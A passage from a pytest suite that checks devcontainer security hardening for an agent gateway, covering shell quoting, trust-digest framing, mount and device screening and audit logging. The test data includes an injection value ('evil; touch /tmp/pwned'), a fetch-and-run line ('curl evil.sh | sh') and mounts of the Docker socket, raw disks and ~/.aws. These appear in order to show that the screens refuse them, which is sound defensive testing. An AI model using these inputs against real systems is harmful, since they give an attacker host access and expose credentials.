        monkeypatch.setattr(devc.asyncio, "create_subprocess_exec", self._fake_exec(0, sink))
        await devc.ensure_agent_definition_available(self._info(), "kirocrew")
        argv = sink[-1]
        assert argv[argv.index("-u") + 1] == "vscode"
        assert argv[argv.index("-w") + 1] == "/workspaces/proj"

    @pytest.mark.asyncio
    async def test_a_missing_definition_is_refused_with_the_fix_named(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        sink: list[list[str]] = []
        monkeypatch.setattr(devc.asyncio, "create_subprocess_exec", self._fake_exec(1, sink))
        monkeypatch.setattr(devc, "try_inject_host_agent", lambda *a, **k: False)
        with pytest.raises(devc.DevcontainerError, match=r"\.kiro/agents/kirocrew\.json"):
            await devc.ensure_agent_definition_available(self._info(), "kirocrew")

    @pytest.mark.asyncio
    async def test_a_host_global_definition_is_injected_then_reprobed(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        sink: list[list[str]] = []
        codes = [1, 0]

        async def _inner(*argv: str, **kw: object):
            sink.append(list(argv))
            return self._Proc(codes.pop(0) if codes else 0)

        monkeypatch.setattr(devc.asyncio, "create_subprocess_exec", _inner)
        monkeypatch.setattr(devc, "try_inject_host_agent", lambda *a, **k: True)
        await devc.ensure_agent_definition_available(self._info(), "kirocrew")
        assert len(sink) == 2

    @pytest.mark.asyncio
    async def test_the_agent_name_is_shell_quoted(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """The name is interpolated into an ``sh -c`` script and comes from
        configuration, which agent-run code can propose edits to."""
        sink: list[list[str]] = []
        monkeypatch.setattr(devc.asyncio, "create_subprocess_exec", self._fake_exec(0, sink))
        await devc.ensure_agent_definition_available(self._info(), "evil; touch /tmp/pwned")
        script = sink[-1][-1]
        assert "'evil; touch /tmp/pwned.json'" in script, script

    @pytest.mark.asyncio
    async def test_no_agent_means_nothing_to_verify(self, monkeypatch: pytest.MonkeyPatch) -> None:
        sink: list[list[str]] = []
        monkeypatch.setattr(devc.asyncio, "create_subprocess_exec", self._fake_exec(1, sink))
        await devc.ensure_agent_definition_available(self._info(), "")
        assert sink == []

    def test_both_containerized_spawn_paths_run_the_preflight(self) -> None:
        """Two call sites build the same inner argv, so a fix applied to one and
        not the other would leave half the sessions failing the original way."""
        for rel in ("acp/client.py", "acp/runtime.py"):
            src = (Path(devc.__file__).parent / rel).read_text(encoding="utf-8")
            assert "ensure_agent_definition_available(" in src, rel
            assert src.index("ensure_agent_definition_available(devc_info") < src.index(
                # The call's arg list, not the bare symbol: that also
                # matches the import above the preflight.
                "containerize_spawn, devc_info"
            ), f"{rel}: preflight must run BEFORE the spawn"


class TestAuthAndSelectedAgentInject:
    def test_refresh_auth_copy_is_one_way_and_mode_644(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(devc, "_gateway_tmp_root", lambda: tmp_path / "gtmp")
        host_db = tmp_path / "host" / "kiro-cli" / "data.sqlite3"
        host_db.parent.mkdir(parents=True)
        host_db.write_bytes(b"sqlite")
        monkeypatch.setattr(
            "kiro_crew.kiro_cli.kiro_cli_state_dbs",
            lambda *_a, **_k: (host_db,),
        )
        root = devc.refresh_auth_copy(tmp_path / "proj")
        dest = root / "kiro-cli" / "data.sqlite3"
        assert dest.read_bytes() == b"sqlite"
        assert dest.stat().st_mode & 0o777 == 0o644
        dest.write_bytes(b"container-wrote")
        # Host is older than dest — do not write back, do not overwrite.
        devc.refresh_auth_copy(tmp_path / "proj")
        assert dest.read_bytes() == b"container-wrote"
        host_db.write_bytes(b"newer")
        later = time.time() + 10
        os.utime(host_db, (later, later))
        devc.refresh_auth_copy(tmp_path / "proj")
        assert dest.read_bytes() == b"newer"

    def test_try_inject_copies_only_the_named_file(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(devc, "_gateway_tmp_root", lambda: tmp_path / "gtmp")
        agents = tmp_path / "agents"
        agents.mkdir()
        (agents / "kirocrew.json").write_text('{"name":"kirocrew"}', encoding="utf-8")
        (agents / "other.json").write_text('{"name":"other"}', encoding="utf-8")
        monkeypatch.setattr("kiro_crew.config.paths.kiro_agents_dir", lambda: agents)
        assert devc.try_inject_host_agent(tmp_path / "proj", "kirocrew")
        dest = devc.host_agents_inject_dir(tmp_path / "proj")
        assert (dest / "kirocrew.json").is_file()
        assert not (dest / "other.json").exists()
        assert not devc.try_inject_host_agent(tmp_path / "proj", "evil;rm")

    def test_containerize_spawn_forwards_api_key_and_xdg(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        monkeypatch.setattr(devc, "refresh_auth_copy", lambda _p: tmp_path)
        captured: dict[str, dict[str, str]] = {}

        def fake_exec(
            self: object,
            info: object,
            inner: list[str],
            *,
            env: dict[str, str],
            exec_id: str,
            workdir: str | None = None,
        ) -> list[str]:
            captured["env"] = dict(env)
            return ["docker", "exec", "x"]

        monkeypatch.setattr(devc.DevcontainerManager, "exec_argv", fake_exec)
        monkeypatch.setattr(
            devc,
            "inject_kiro_cli_api_key",
            lambda env: env.__setitem__("KIRO_API_KEY", "secret") or env,
        )
        info = TestAgentDefinitionMustBeContainerVisible._info()
        spawn = devc.containerize_spawn(info, ["kiro-cli"], env={"FOO": "1"})
        assert spawn.argv == ["docker", "exec", "x"]
        assert captured["env"]["KIRO_API_KEY"] == "secret"
        assert captured["env"]["XDG_DATA_HOME"] == devc.AUTH_CONTAINER_DIR
        assert captured["env"]["FOO"] == "1"

    def test_remote_user_home_is_linux_shaped(self) -> None:
        assert devc.remote_user_home(None) == "/root"
        assert devc.remote_user_home("root") == "/root"
        assert devc.remote_user_home("vscode") == "/home/vscode"
        assert devc.remote_user_home("../etc") == "/root"


class TestWarmPoolSkipsTrustedDevcontainer:
    @pytest.mark.asyncio
    async def test_trusted_config_is_a_pool_bypass(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from kiro_crew.session import SessionManager

        project = tmp_path / "proj"
        project.mkdir()
        (project / ".devcontainer").mkdir()
        (project / ".devcontainer" / "devcontainer.json").write_text(
            '{"image":"ubuntu:24.04"}', encoding="utf-8"
        )
        monkeypatch.setattr(devc, "devcontainers_enabled", lambda: True)
        monkeypatch.setattr(devc, "is_trusted", lambda path: path == str(project))
        mgr = SessionManager.__new__(SessionManager)
        assert await mgr._cwd_has_trusted_devcontainer(str(project)) is True
        monkeypatch.setattr(devc, "devcontainers_enabled", lambda: False)
        assert await mgr._cwd_has_trusted_devcontainer(str(project)) is False

    def test_get_or_create_consults_the_trusted_check_before_claim(self) -> None:
        from kiro_crew import session as session_mod

        src = Path(session_mod.__file__).read_text(encoding="utf-8")
        assert "bypass_devcontainer" in session_mod.POOL_DECISIONS
        decision = src.index('pool_decision = "bypass_devcontainer"')
        claim = src.index("await self._drain_and_claim(agent)")
        assert decision < claim


class TestComposeSurfacesFoundAfterTheFirstPass:
    """A second review pass found four more surfaces in the same class as the
    first, plus one bug introduced BY that fix. Recorded together because the
    lesson is that closing one spelling of a hazard does not close the hazard:
    ``--device`` was fixed while compose's own ``devices:`` stayed open, and
    ``extends.file`` was refused while ``include:`` stayed open.
    """

    def test_top_level_include_is_refused(self) -> None:
        """``include`` pulls in whole compose files that may sit outside the
        hashed tree, so their services take effect while contributing nothing to
        the digest -- the same trust hole as ``extends.file``, refused for the
        same reason rather than screened."""
        with pytest.raises(devc.DevcontainerError, match="cannot be covered by the trust digest"):
            devc._compose_top_level_host_paths({"include": ["../../agent.yml"]})

    @pytest.mark.parametrize(
        "svc",
        [
            {"devices": ["/dev/sda:/dev/xvda"]},
            {"devices": ["/dev/kmsg"]},
            {"devices": [{"source": "/dev/sda", "target": "/dev/xvda"}]},
        ],
        ids=["short-form", "bare-node", "long-form"],
    )
    def test_compose_devices_are_collected(self, svc: dict) -> None:
        """Compose's own spelling of ``--device``. Fixing only the docker flag
        left raw host-disk access reachable from a compose service."""
        found = devc._compose_service_host_paths(svc)
        assert any(f.startswith("/dev/") for f in found), found

    @pytest.mark.parametrize(
        ("name", "expected_tail"),
        [("compose.yml", ".devcontainer"), ("sub/compose.yml", "sub"), ("./a/b.yml", "a")],
    )
    def test_a_nested_compose_file_anchors_on_its_own_directory(
        self, name: str, expected_tail: str
    ) -> None:
        """Compose resolves each file's relative paths against THAT file's
        directory. Anchoring every reference at ``.devcontainer/`` meant a bind
        was screened as one host path and built as another -- the screen and the
        build disagreed, which is worse than either being wrong alone."""
        got = devc._compose_file_dir("/proj/.devcontainer", name)
        assert Path(got).name == expected_tail, got

    @pytest.mark.parametrize(
        ("run_args", "already_set"),
        [
            (["--memory-reservation", "128m"], False),
            (["--memory-swappiness", "0"], False),
            (["--memory-swap", "1g"], False),
            (["--memory", "2g"], True),
            (["--memory=2g"], True),
        ],
        ids=["reservation", "swappiness", "swap", "exact", "equals-form"],
    )
    def test_only_an_exact_memory_flag_counts_as_already_capped(
        self, run_args: list[str], already_set: bool
    ) -> None:
        """A substring test over the joined argv silently DISABLED the ceiling it
        guards: ``--memory-reservation`` contains ``--memory``, so a soft
        reservation suppressed the hard cap and left the container able to
        exhaust host memory. The three prefix flags must NOT count as the cap;
        the exact and equals forms must."""
        assert devc._has_run_flag(run_args, "--memory") is already_set
        parsed = {"runArgs": list(run_args)}
        devc._apply_default_resource_caps(parsed)
        out = parsed["runArgs"]
        # Either way a hard cap must be present, and never duplicated.
        assert devc._has_run_flag(out, "--memory")
        assert out.count("--memory") <= 1, out

    def test_relative_additional_contexts_are_absolutized_in_the_frozen_copy(self) -> None:
        """Collecting a path for SCREENING without absolutizing it for the BUILD
        is worse than not collecting it: freezing moves the file into the build
        dir, so the value screened against the project resolves somewhere else
        at build time. This gap was introduced by the fix that added
        additional_contexts to the screen.

        The expectation is COMPUTED with the same primitive production uses
        (``realpath(join(base, value))``) rather than written as a POSIX literal:
        the rewrite is platform-independent, but its output spelling is not --
        on Windows the same logic yields ``D:\\proj\\...``, so a hardcoded
        ``/proj/...`` asserts the platform rather than the behaviour.
        """
        base = os.path.join(os.sep + "proj", ".devcontainer", "sub")
        doc = {
            "services": {
                "app": {
                    "build": {
                        "context": ".",
                        "additional_contexts": {"creds": "./secrets", "svc": "service:api"},
                    }
                }
            }
        }
        out = yaml.safe_load(devc._compose_hardened(yaml.safe_dump(doc).encode(), base))
        extra = out["services"]["app"]["build"]["additional_contexts"]
        assert extra["creds"] == os.path.realpath(os.path.join(base, "./secrets")), extra
        # Kept as an acceptance case: a named context is not a host path and
        # must not be mangled into one.
        assert extra["svc"] == "service:api", extra

    def test_the_list_form_of_additional_contexts_is_also_absolutized(self) -> None:
        base = os.path.join(os.sep + "proj", ".devcontainer")
        doc = {
            "services": {
                "app": {"build": {"additional_contexts": ["creds=./secrets", "svc=service:api"]}}
            }
        }
        out = yaml.safe_load(devc._compose_hardened(yaml.safe_dump(doc).encode(), base))
        extra = out["services"]["app"]["build"]["additional_contexts"]
        expected = "creds=" + os.path.realpath(os.path.join(base, "./secrets"))
        assert expected in extra, extra
        assert "svc=service:api" in extra, extra


class TestMountInheritanceIsRefused:
    """``--volumes-from`` / ``volumes_from`` inherit ANOTHER container's mounts.

    There is no path to screen: the inherited set is whatever that container
    mounted, which may include every location the sensitive-path screen exists to
    refuse. Refused rather than collected for the same reason as ``extends.file``
    and ``include`` -- what it reaches is not describable from the config the
    human approved, so the grant could not cover it.
    """

    @pytest.mark.parametrize(
        "run_args",
        [["--volumes-from", "creds"], ["--volumes-from=creds"], ["-i", "--volumes-from", "c"]],
        ids=["separate-arg", "equals-form", "after-other-flags"],
    )
    def test_run_args_volumes_from_is_refused(self, run_args: list[str]) -> None:
        with pytest.raises(devc.DevcontainerError, match="another container's mounts"):
            devc._collect_host_mount_sources({"runArgs": run_args})

    def test_compose_volumes_from_is_refused(self) -> None:
        with pytest.raises(devc.DevcontainerError, match="another container's mounts"):
            devc._compose_service_host_paths({"volumes_from": ["other"]})

    def test_an_ordinary_config_is_unaffected(self) -> None:
        """Acceptance case, so a blanket refusal in this area cannot pass."""
        found = devc._collect_host_mount_sources(
            {"runArgs": ["-i", "--memory", "2g"], "mounts": ["source=./src,target=/w,type=bind"]}
        )
        assert "./src" in found, found
        assert devc._compose_service_host_paths({"volumes": ["./src:/w"]}) == ["./src"]


class TestDigestFramingIsInjective:
    """The trust digest must encode its input set unambiguously.

    NUL-delimiting alone is not enough, because file CONTENT is arbitrary bytes
    and may contain the delimiter. A single file holding
    ``X\\0Dockerfile\\0RUN ...`` serializes to the same stream as two files
    ``devcontainer.json``=``X`` and ``Dockerfile``=``RUN ...``, so the two trees
    share a digest and a grant approved against the one-file tree also authorizes
    an unlisted build input the human never saw in the prompt. Length-prefixing
    each field makes the encoding injective, which is the property a
    content-bound grant rests on.
    """

    def test_a_content_embedded_delimiter_cannot_forge_a_second_file(self) -> None:
        approved = [("devcontainer.json", b"X\x00Dockerfile\x00RUN curl evil.sh | sh")]
        substituted = [
            ("devcontainer.json", b"X"),
            ("Dockerfile", b"RUN curl evil.sh | sh"),
        ]
        assert devc._digest_entries(approved, b"tree") != devc._digest_entries(substituted, b"tree")

    def test_a_path_boundary_cannot_be_shifted_into_the_content(self) -> None:
        """The same ambiguity in the other direction: bytes moved across the
        path/content boundary must change the digest."""
        left = [("ab", b"c")]
        right = [("a", b"bc")]
        assert devc._digest_entries(left, b"tree") != devc._digest_entries(right, b"tree")

    def test_the_entry_count_is_bound(self) -> None:
        """Re-partitioning a set without changing its concatenated bytes must
        still change the digest."""
        one = [("a", b"")]
        two = [("a", b""), ("", b"")]
        assert devc._digest_entries(one, b"tree") != devc._digest_entries(two, b"tree")

    def test_identical_input_still_hashes_identically(self) -> None:
        """Acceptance case: the digest must remain stable for equal input, or
        every unchanged config would re-prompt."""
        entries = [("devcontainer.json", b'{"name":"x"}'), ("Dockerfile", b"FROM x")]
        assert devc._digest_entries(entries, b"tree") == devc._digest_entries(
            list(entries), b"tree"
        )

    def test_the_layout_marker_still_separates_tree_from_single_file(self) -> None:
        entries = [("devcontainer.json", b"{}")]
        assert devc._digest_entries(entries, b"tree") != devc._digest_entries(entries, b"file")


class TestFileCeilingIsEnforcedOnTheOpenedInode:
    """The per-file ceiling has to hold against the fd actually read.

    The walk's pre-open ``stat()`` is a different file from the one the opener
    reads: between the two the path can be replaced, so a member that measured
    small can be read as an arbitrarily large one. Since this walk is reachable
    from dashboard status polling, that lets a project decide how much gateway
    memory to consume. The check therefore sits on the same ``fstat`` as the mode
    and link-count checks, and the read is bounded.
    """

    def test_an_oversized_file_is_refused_by_the_opener(self, tmp_path: Path) -> None:
        cfg = tmp_path / "devcontainer.json"
        cfg.write_bytes(b"a" * (devc._MAX_TREE_FILE_BYTES + 10))
        with pytest.raises(devc.DevcontainerError, match="per-file limit"):
            devc._read_config_bytes(cfg, str(tmp_path))

    def test_a_file_that_under_reports_its_size_is_still_bounded(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Pins the BOUNDED READ specifically, which is the layer that closes the
        race rather than the static case.

        The fstat ceiling and the bounded read both refuse a file that is already
        oversized, so a test using only a big file passes with either one removed
        and proves neither. Here fstat is made to under-report -- exactly what a
        swap or an append after the stat looks like -- so the size check cannot
        fire and only the bounded read can refuse.
        """
        cfg = tmp_path / "devcontainer.json"
        cfg.write_bytes(b"a" * (devc._MAX_TREE_FILE_BYTES + 10))

        real_fstat = os.fstat

        class _Lying:
            def __init__(self, st: object) -> None:
                self._st = st

            def __getattr__(self, name: str) -> object:
                return getattr(self._st, name)

            @property
            def st_size(self) -> int:
                return 12

        monkeypatch.setattr(devc.os, "fstat", lambda fd: _Lying(real_fstat(fd)))
        with pytest.raises(devc.DevcontainerError, match="grew past|per-file limit"):
            devc._read_config_bytes(cfg, str(tmp_path))

    def test_a_benign_file_is_still_read_whole(self, tmp_path: Path) -> None:
        """Acceptance case, so a blanket refusal cannot pass this class."""
        cfg = tmp_path / "devcontainer.json"
        cfg.write_bytes(b'{"name":"x"}')
        assert devc._read_config_bytes(cfg, str(tmp_path)) == b'{"name":"x"}'

    def test_a_file_at_exactly_the_limit_is_accepted(self, tmp_path: Path) -> None:
        """Boundary: the ceiling is inclusive, so the bounded read must not
        report growth for a file sitting exactly on it."""
        cfg = tmp_path / "devcontainer.json"
        cfg.write_bytes(b"a" * devc._MAX_TREE_FILE_BYTES)
        assert len(devc._read_config_bytes(cfg, str(tmp_path))) == devc._MAX_TREE_FILE_BYTES

    def test_the_total_is_accounted_from_bytes_actually_read(self) -> None:
        """The tree total must sum what was READ, not the pre-open stat, or a
        set of files each swapped after their own stat could sum past the cap
        while every individual stat looked small."""
        src = Path(devc.__file__).read_text(encoding="utf-8")
        walk = src[src.index("def _read_config_tree(") : src.index("def _digest_entries(")]
        assert "total += len(data)" in walk, walk[-400:]
        assert "total += size" not in walk, "the stale pre-open size still feeds the total"


class TestNonObjectJsonBodiesAreRejected:
    """A well-formed non-object body must be a 400, not a 500.

    ``request.json()`` succeeds for any valid JSON, so ``[1]`` / ``"x"`` / ``5`` /
    ``true`` reached the mutation handlers as a list, str, int or bool and
    ``(body or {}).get(...)`` raised AttributeError. The falsy non-objects
    (``[]``, ``""``, ``0``, ``null``) took the ``or {}`` branch and never crashed,
    which is why the guard tests the TYPE rather than the truthiness -- a test
    written against ``[]`` would pass with the bug present.
    """

    @pytest.mark.parametrize(
        "body",
        [[1], ["a"], "abc", 5, 1.5, True],
        ids=["list", "list-str", "str", "int", "float", "bool"],
    )
    def test_truthy_non_objects_are_rejected(self, body: object) -> None:
        assert devc_handlers._object_body(body) is None

    @pytest.mark.parametrize(
        "body", [[], "", 0, None], ids=["empty-list", "empty-str", "zero", "null"]
    )
    def test_falsy_non_objects_are_rejected_too(self, body: object) -> None:
        """These never crashed, so they were never a 500 -- but they are still
        not objects, and accepting them would silently treat a malformed request
        as an empty one."""
        assert devc_handlers._object_body(body) is None

    def test_an_object_is_accepted_unchanged(self) -> None:
        payload = {"project": "/p", "digest": "abc"}
        assert devc_handlers._object_body(payload) == payload

    def test_every_mutation_handler_routes_through_the_guard(self) -> None:
        """Three handlers repeat the same body-parsing block; fixing only the one
        the finding cited would leave the other two returning 500."""
        src = Path(devc_handlers.__file__).read_text(encoding="utf-8")
        assert src.count("body = _object_body(raw_body)") == 3, src.count(
            "body = _object_body(raw_body)"
        )
        assert "(body or {}).get(" not in src, "a handler still tolerates a non-dict body"


class TestBlockingProbesAreOffTheEventLoop:
    """Config reads and PATH walks must not run on the gateway's event loop.

    ``devcontainers_enabled()`` reads config from disk and ``docker_available()``
    / ``_cli_argv()`` walk PATH stat-ing every candidate and its ancestors. Every
    call site is inside an ``async def`` reached from dashboard status polling and
    session start, so on a network-backed home or a stalled PATH entry they freeze
    chat and heartbeat processing for the whole gateway -- not just this feature.

    Asserted by recording what gets handed to ``asyncio.to_thread`` rather than by
    timing: a duration-based test would be a flake, and a source grep would pass
    on a call that is offloaded somewhere the request never reaches.
    """

    @staticmethod
    def _recording_to_thread(sink: list[str]):
        real = asyncio.to_thread

        async def _spy(func, /, *args, **kwargs):
            sink.append(getattr(func, "__name__", repr(func)))
            return await real(func, *args, **kwargs)

        return _spy

    @pytest.mark.asyncio
    async def test_status_offloads_the_config_read_and_the_path_walk(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, trust_home: Path
    ) -> None:
        offloaded: list[str] = []
        monkeypatch.setattr(devc.asyncio, "to_thread", self._recording_to_thread(offloaded))
        project = tmp_path / "proj"
        project.mkdir()
        await devc.DevcontainerManager().status(project)
        assert "devcontainers_enabled" in offloaded, offloaded

    @pytest.mark.asyncio
    async def test_the_session_start_path_offloads_both_probes(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """``resolve_for_work_dir`` is the session-start entry point, so a block
        here delays the first turn of every session, not only a status poll.

        The fakes are NAMED functions rather than lambdas: the recorder keys on
        ``__name__``, so a lambda would land in the log as ``<lambda>`` and the
        assertion would look for a name that cannot appear.
        """
        offloaded: list[str] = []
        monkeypatch.setattr(devc.asyncio, "to_thread", self._recording_to_thread(offloaded))

        def devcontainers_enabled() -> bool:
            return True

        def docker_available() -> bool:
            return False

        monkeypatch.setattr(devc.sys, "platform", "linux")
        monkeypatch.setattr(devc, "devcontainers_enabled", devcontainers_enabled)
        monkeypatch.setattr(devc, "docker_available", docker_available)
        project = tmp_path / "proj"
        project.mkdir()
        # A real config is required to reach the docker probe: resolution returns
        # early when the work dir carries none, so a bare temp dir would exercise
        # only the first probe and the second assertion could never pass.
        _write_primary(project)
        assert await devc.resolve_for_work_dir(project) is None
        assert "devcontainers_enabled" in offloaded, offloaded
        assert "docker_available" in offloaded, offloaded


class TestComposeBuildInputsAreContentBound:
    """A compose service's build inputs must stay inside the hashed tree.

    ``assert_build_inputs_contained`` already held devcontainer.json to this, but
    the compose file's own ``build:`` was only screened for SENSITIVE targets. A
    context under the project root is not sensitive, so that screen passed it and
    its Dockerfile was never hashed -- editing the Dockerfile afterwards changed
    what the build executes while the grant stayed valid, which is precisely what
    the digest exists to prevent.

    Every case goes through ``config_digest``, the gate on every build path.
    Calling the containment helper directly passed even with its only call site
    deleted, which proved the helper raises in isolation and nothing more.
    """

    @staticmethod
    def _project(tmp_path: Path, compose: dict, name: str = "compose.yml") -> Path:
        import yaml as y

        project = tmp_path / uuid.uuid4().hex[:8]
        target = project / ".devcontainer" / name
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(y.safe_dump(compose), encoding="utf-8")
        (project / ".devcontainer" / "devcontainer.json").write_bytes(
            json.dumps({"dockerComposeFile": name, "service": "app"}).encode()
        )
        return project

    def _digest(self, tmp_path: Path, compose: dict, name: str = "compose.yml") -> None:
        project = self._project(tmp_path, compose, name)
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        devc.config_digest(cfg)

    @pytest.mark.parametrize(
        "context",
        ["..", "../", "../..", "../sibling", "./../up"],
        ids=["parent", "parent-slash", "grandparent", "parent-sibling", "dotted-parent"],
    )
    def test_a_context_escaping_the_hashed_tree_is_refused(
        self, tmp_path: Path, context: str
    ) -> None:
        with pytest.raises(devc.DevcontainerError, match="outside .devcontainer/"):
            self._digest(tmp_path, {"services": {"app": {"build": {"context": context}}}})

    def test_an_escaping_dockerfile_is_refused(self, tmp_path: Path) -> None:
        with pytest.raises(devc.DevcontainerError, match="outside .devcontainer/"):
            self._digest(
                tmp_path, {"services": {"app": {"build": {"dockerfile": "../Dockerfile"}}}}
            )

    def test_the_string_shorthand_is_screened_too(self, tmp_path: Path) -> None:
        """``build: ..`` is the context in shorthand form, so skipping the string
        spelling would leave the same escape open under a different syntax."""
        with pytest.raises(devc.DevcontainerError, match="outside .devcontainer/"):
            self._digest(tmp_path, {"services": {"app": {"build": ".."}}})

    def test_an_escaping_additional_context_is_refused(self, tmp_path: Path) -> None:
        with pytest.raises(devc.DevcontainerError, match="outside .devcontainer/"):
            self._digest(
                tmp_path,
                {"services": {"app": {"build": {"additional_contexts": {"extra": "../x"}}}}},
            )

    def test_a_contained_context_is_accepted(self, tmp_path: Path) -> None:
        """Acceptance case: the rule must not refuse the layout it is meant to
        allow, or the feature is unreachable rather than content-bound."""
        self._digest(tmp_path, {"services": {"app": {"build": {"context": "."}}}})
        self._digest(tmp_path, {"services": {"app": {"build": {"context": "./build"}}}})

    def test_a_nested_compose_file_resolves_against_its_own_directory(self, tmp_path: Path) -> None:
        """Compose resolves a relative path against THAT file's directory, so a
        nested file has one more level of headroom before escaping -- anchoring
        every file at .devcontainer/ would refuse a legal config here and admit an
        escaping one from the top level."""
        # From sub/, `..` lands back on .devcontainer/ -- still contained.
        self._digest(
            tmp_path, {"services": {"app": {"build": {"context": ".."}}}}, "sub/compose.yml"
        )
        # From sub/, `../..` escapes.
        with pytest.raises(devc.DevcontainerError, match="outside .devcontainer/"):
            self._digest(
                tmp_path,
                {"services": {"app": {"build": {"context": "../.."}}}},
                "sub/compose.yml",
            )

    def test_a_service_reference_is_not_treated_as_a_path(self, tmp_path: Path) -> None:
        """`service:` values in additional_contexts are not host paths; screening
        them would refuse benign configs."""
        self._digest(
            tmp_path,
            {"services": {"app": {"build": {"additional_contexts": {"api": "service:other"}}}}},
        )


class TestRebuildHonorsTheOptIn:
    """The rebuild endpoint must refuse while ``agent.devcontainer`` is off.

    A trust grant OUTLIVES the mode being turned off, so with a grant already on
    disk this was the one request that could build and start a container while
    the feature was disabled -- the state an operator sets precisely to stop that.
    The session-start path already gated; this endpoint did not, and it is the
    only request that reaches ``up()``.
    """

    @pytest.mark.asyncio
    async def test_rebuild_is_refused_when_the_mode_is_off(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, as_owner: None
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        monkeypatch.setattr(devc_handlers, "devcontainers_enabled", lambda: False)

        called: list[str] = []

        class _Manager:
            async def up(self, project_dir: object, *, rebuild: bool = False) -> object:
                called.append(str(project_dir))
                raise AssertionError("up() must not be reached while the mode is off")

        monkeypatch.setattr(devc_handlers, "get_manager", lambda: _Manager())
        resp = await devc_handlers.api_devcontainer_rebuild(
            _trust_request({"project": str(project)}, str(project))
        )
        assert resp.status == 409
        assert _body(resp)["code"] == "devcontainer_disabled"
        # The gate has to stop the build, not merely relabel its result.
        assert called == []

    @pytest.mark.asyncio
    async def test_rebuild_still_works_when_the_mode_is_on(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, as_owner: None
    ) -> None:
        """Acceptance case: the gate must not disable the endpoint outright."""
        project = tmp_path / "proj"
        project.mkdir()
        monkeypatch.setattr(devc_handlers, "devcontainers_enabled", lambda: True)

        class _Info:
            container_id = "abcdef012345678"
            remote_workspace_folder = "/workspaces/proj"

        class _Manager:
            async def up(self, project_dir: object, *, rebuild: bool = False) -> object:
                return _Info()

        monkeypatch.setattr(devc_handlers, "get_manager", lambda: _Manager())
        resp = await devc_handlers.api_devcontainer_rebuild(
            _trust_request({"project": str(project)}, str(project))
        )
        assert resp.status == 200
        assert _body(resp)["container_id"] == "abcdef012345678"

    @pytest.mark.asyncio
    async def test_a_disabled_refusal_is_audited_as_denied(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        as_owner: None,
        sel_recorder: _SelRecorder,
    ) -> None:
        """A refusal is a permission decision, so it belongs in the audit log and
        not only in the caller's response -- a 409 nothing records leaves no trace
        that the gate did its job."""
        project = tmp_path / "proj"
        project.mkdir()
        monkeypatch.setattr(devc_handlers, "devcontainers_enabled", lambda: False)
        await devc_handlers.api_devcontainer_rebuild(
            _trust_request({"project": str(project)}, str(project))
        )
        denied = [e for e in sel_recorder.calls if e["outcome"] == "denied"]
        assert denied, f"no denied event recorded: {sel_recorder.calls}"
        assert denied[-1]["operation"] == "devcontainer_rebuild"

    @pytest.mark.asyncio
    async def test_a_trust_refusal_is_audited_as_denied(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        as_owner: None,
        sel_recorder: _SelRecorder,
    ) -> None:
        """The revoked/changed-trust path is the one the finding named: it raises
        DevcontainerNotTrusted and returned 409 with no permission event."""
        project = tmp_path / "proj"
        project.mkdir()
        monkeypatch.setattr(devc_handlers, "devcontainers_enabled", lambda: True)

        class _Manager:
            async def up(self, project_dir: object, *, rebuild: bool = False) -> object:
                raise devc.DevcontainerNotTrusted("not trusted")

        monkeypatch.setattr(devc_handlers, "get_manager", lambda: _Manager())
        resp = await devc_handlers.api_devcontainer_rebuild(
            _trust_request({"project": str(project)}, str(project))
        )
        assert resp.status == 409
        denied = [e for e in sel_recorder.calls if e["outcome"] == "denied"]
        assert denied, f"no denied event recorded: {sel_recorder.calls}"
        assert denied[-1]["operation"] == "devcontainer_rebuild"
        assert "DevcontainerNotTrusted" in denied[-1]["resources"]


class TestLocalVolumeBindOptionsAreScreened:
    """A local-driver volume carrying `volume-opt=device` IS a bind.

    The host path lives in the OPTION, never in `source`, so a screen that
    collected only `source`/`src` skipped it and a
    `--mount type=volume,volume-opt=device=/run,volume-opt=o=bind` handed over the
    runtime socket. Compose's `driver_opts.device` spelling was already screened;
    this is the same hazard's `--mount` spelling.
    """

    @staticmethod
    def _project(tmp_path: Path, cfg: dict) -> Path:
        project = tmp_path / uuid.uuid4().hex[:8]
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_bytes(json.dumps(cfg).encode())
        return project

    @pytest.mark.parametrize(
        "device",
        ["/run", "/var/run", "/run/docker.sock", "/proc"],
        ids=["run-dir", "var-run", "socket", "proc"],
    )
    def test_a_device_option_naming_a_control_path_is_refused(
        self, tmp_path: Path, device: str
    ) -> None:
        project = self._project(
            tmp_path,
            {
                "image": "x",
                "runArgs": [
                    "--mount",
                    f"type=volume,dst=/t,volume-opt=device={device},volume-opt=o=bind",
                ],
            },
        )
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="host control interface"):
            devc.config_digest(cfg)

    def test_a_device_option_naming_a_credential_dir_is_refused(self, tmp_path: Path) -> None:
        """The same option also reaches credentials, which is the other screen."""
        aws = os.path.join(os.path.expanduser("~"), ".aws")
        project = self._project(
            tmp_path,
            {
                "image": "x",
                "runArgs": ["--mount", f"type=volume,dst=/t,volume-opt=device={aws}"],
            },
        )
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="sensitive host path"):
            devc.config_digest(cfg)

    def test_a_named_volume_without_a_device_option_is_still_allowed(self, tmp_path: Path) -> None:
        """Acceptance case: a real named volume has no host path, so screening
        must not refuse it -- otherwise the fix breaks ordinary volume use."""
        project = self._project(
            tmp_path,
